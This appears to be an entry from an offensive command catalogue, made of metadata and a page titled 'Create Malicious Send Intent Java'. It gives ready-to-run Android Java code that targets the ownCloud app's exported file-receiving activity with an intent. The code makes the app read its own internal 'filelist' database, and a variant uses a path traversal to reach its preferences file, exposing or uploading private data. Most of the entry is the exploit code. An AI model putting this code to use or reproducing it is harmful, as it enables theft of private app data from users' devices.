---
data: >-
  StrictMode.VmPolicy.Builder builder =new StrictMode.VmPolicy.Builder();
  StrictMode.setVmPolicy(builder.build()); Intent intent =new
  Intent("android.intent.action.SEND");
  intent.setClassName("com.owncloud.android","com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
  intent.setType("*/*"); intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  intent.putExtra("android.intent.extra.STREAM",Uri.parse("file:///data/user/0/com.owncloud.android/databases/filelist"));
  startActivity(intent);
tags:
  - android
  - intent
type: command
output: null
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:45.272Z'
id: d4e1a31f-63ee-4aa3-8408-5c6fc88d6fa4
verified: false
validated: true
submitted: true
---
# Create Malicious Send Intent Java

## Command

```java
StrictMode.VmPolicy.Builder builder =new StrictMode.VmPolicy.Builder(); StrictMode.setVmPolicy(builder.build()); Intent intent =new Intent("android.intent.action.SEND"); intent.setClassName("com.owncloud.android","com.owncloud.android.ui.activity.ReceiveExternalFilesActivity"); intent.setType("*/*"); intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); intent.putExtra("android.intent.extra.STREAM",Uri.parse("file:///data/user/0/com.owncloud.android/databases/filelist")); startActivity(intent);
```

## Description

This Java code snippet, used in a malicious Android app, creates and launches an intent to exploit the ownCloud app by sending a file URI to its exported activity, granting read permission to an internal database file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| setClassName | Targets the ownCloud package and activity | Yes |
| android.intent.action.SEND | Intent action for sharing data | Yes |
| android.intent.extra.STREAM | URI of the target file | Yes |
| Intent.FLAG_GRANT_READ_URI_PERMISSION | Grants read access to the URI | Yes |

## Examples

### Basic Usage

```java
// As above, targets filelist database
```

### Advanced Usage

```java
// Target preferences instead
intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/data/./com.owncloud.android/shared_prefs/com.owncloud.android_preferences.xml"));
```

## Expected Output

The ownCloud activity launches and processes the internal file, potentially exposing or uploading its contents without errors.

## Related

- [[Related Procedure: Craft Malicious Intent for Internal File Access]]
